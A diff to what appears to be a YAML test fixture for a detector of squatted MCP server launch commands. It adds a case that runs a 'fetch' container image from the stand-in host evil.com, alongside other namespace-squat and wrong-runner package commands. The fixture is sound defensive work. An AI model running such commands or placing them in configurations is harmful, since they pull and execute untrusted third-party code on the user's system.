@@ -29,6 +29,8 @@ should_match:
     note: Docker namespace squat. Same image name as ghcr.io/github/github-mcp-server, but under another owner.
   - text: docker run -i evil/fetch
     note: Docker namespace squat. Same image name as mcp/fetch, but under another owner.
+  - text: docker run -i evil.com/fetch
+    note: Docker namespace squat on another registry. A host that is not Docker Hub has no official namespace, so this is a third party image with the name of mcp/fetch.
   - text: npx mcp-server-fetch
     note: Popular PyPI name under an npm runner. The real server runs with uvx, so the npm package may be a squat.
   - text: uvx firecrawl-mcp
